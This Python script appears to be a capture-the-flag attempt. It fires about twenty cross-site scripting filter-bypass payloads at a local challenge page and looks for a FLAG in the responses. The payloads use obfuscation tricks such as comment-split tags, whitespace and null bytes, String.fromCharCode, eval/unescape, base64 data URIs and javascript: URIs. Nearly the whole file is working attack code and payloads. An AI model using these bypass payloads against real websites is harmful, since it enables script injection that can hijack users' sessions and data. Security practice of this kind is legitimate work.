import requests
import urllib.parse
import re
import base64

base_url = "http://127.0.0.1:33203/page"

# Testing various encoding chains and bypass techniques
encoding_chain_payloads = [
    # Using HTML comments to break up tags
    ("HTML comment break", "<svg<!-- --> onload=alert('XSS')>", "html_comment_break"),
    
    # Newline obfuscation
    ("Newline obfuscation", "<svg\nonload=alert('XSS')>", "newline_obf"),
    
    # Tab obfuscation
    ("Tab obfuscation", "<svg\\tonload=alert('XSS')>", "tab_obf"),
    
    # Using &#x00 (null byte)
    ("Null byte", "<svg onload=alert('XSS')\x00>", "null_byte"),
    
    # Backslash escaping
    ("Backslash escape", "<svg onload=alert('XSS')\\>", "backslash_escape"),
    
    # Multiple spaces
    ("Multiple spaces", "<svg onload=     alert('XSS')>", "multi_space"),
    
    # Style tag with expression() - older IE technique
    ("Style expression", '<div style="x:expression(alert("XSS"))">', "style_expression"),
    
    # SVG with script
    ("SVG script", "<svg><script>alert('XSS')</script>", "svg_script"),
    
    # Using data URI with base64
    ('Data URI base64', '<iframe src="data:text/html;base64,' + base64.b64encode(b'<script>alert("XSS")</script>').decode() + '">', "data_uri_b64"),
    
    # Eval with string
    ("Eval string", "<svg onload=eval('alert(\\'XSS\\')')>", "eval_string"),
    
    # Obfuscated with String.fromCharCode
    ("CharCode obf", "<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>", "charcode_obf"),
    
    # Using document.write
    ("Document write", "<svg onload=document.write('<script>alert(\\\\'XSS\\\\')</script>')>", "doc_write"),
    
    # Using innerHTML
    ("InnerHTML", "<svg onload=innerHTML=String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,39,88,83,83,39,41,60,47,115,99,114,105,112,116,62)>", "innerhtml"),
    
    # Using location.replace
    ("Location replace", '<svg onload=location.replace("javascript:alert(\\'XSS\\')")>', "location_replace"),
    
    # Using window.open
    ("Window open", '<svg onload=window.open("javascript:alert(\\'XSS\\')")>', "window_open"),
    
    # SetTimeout
    ("SetTimeout", '<svg onload=setTimeout(alert("XSS"),0)>', "settimeout"),
    
    # SetInterval
    ("SetInterval", '<svg onload=setInterval(alert("XSS"),1000)>', "setinterval"),
    
    # Using eval + unescape
    ("Eval unescape", '<svg onload=eval(unescape("alert(%27XSS%27)"))>', "eval_unescape"),
    
    # Using VBScript (for IE)
    ("VBScript", '<svg onload=vbscript:msgbox("XSS")>', "vbscript"),
    
    # Using livescript
    ("Livescript", '<svg onload=livescript:alert("XSS")>', "livescript"),
    
    # Mocha/Other JS variants
    ("Mocha", '<svg onload=mocha:alert("XSS")>', "mocha"),
]

print("[*] Testing Advanced XSS Encoding Chains")

all_results = []

for test_name, payload, test_id in encoding_chain_payloads:
    print(f"\n[+] Testing: {test_name}")
    print(f"    [PAYLOAD] {payload[:80]}")
    
    try:
        params = {'name': payload}
        response = requests.get(base_url, params=params, timeout=10)
        
        payload_reflected = payload in response.text
        response_length = len(response.content)
        
        # Check for various indicators
        indicators = []
        if 'alert' in response.text.lower():
            indicators.append('alert')
        if 'XSS' in response.text:
            indicators.append('XSS')
        if 'svg' in response.text.lower() or 'img' in response.text.lower() or 'iframe' in response.text.lower():
            indicators.append('html_tag')
        
        # Check for FLAG patterns
        flag_patterns = re.findall(r'FLAG\{[^}]+\}', response.text)
        
        print(f"    [STATUS]  {response.status_code}")
        print(f"    [LENGTH]  {response_length} bytes")
        print(f"    [REFLECT] Payload reflected: {payload_reflected}")
        
        if indicators:
            print(f"    [FOUND]   Indicators: {', '.join(indicators)}")
        
        if flag_patterns:
            print(f"    [!!]      FLAG FOUND: {flag_patterns}")
            # Also print the exact response
            print(f"    [RESPONSE]: {response.text}")
        
        # Check which message appears
        if 'error_star.png' in response.text:
            print(f"    [VISUAL]  Failed! Try again!")
            result_status = "FAILED"
        elif 'new_star.png' in response.text:
            print(f"    [VISUAL]  Let the game begin (filtered)")
            result_status = "FILTERED"
        else:
            result_status = "UNKNOWN"
        
        # Store results
        all_results.append({
            'test_name': test_name,
            'payload': payload,
            'status': response.status_code,
            'length': response_length,
            'reflected': payload_reflected,
            'indicators': indicators,
            'flags': flag_patterns,
            'result_status': result_status
        })
        
    except Exception as e:
        print(f"    [ERROR]   {str(e)}")
        all_results.append({
            'test_name': test_name,
            'error': str(e)
        })

# Summary
print("\n[*] Testing Summary:")
print("-" * 80)
for result in all_results:
    if 'error' in result:
        print(f"[ERROR] {result['test_name']}: {result['error']}")
    else:
        status_str = f"{result['result_status']:10}"
        print(f"[{status_str}] {result['test_name']:<30} | Reflected: {result['reflected']}")
        if result['flags']:
            print(f"  [!] FLAG FOUND: {result['flags']}")
        elif result['indicators']:
            print(f"  [+] Indicators: {result['indicators']}")

print("\n[*] Encoding chain testing complete")
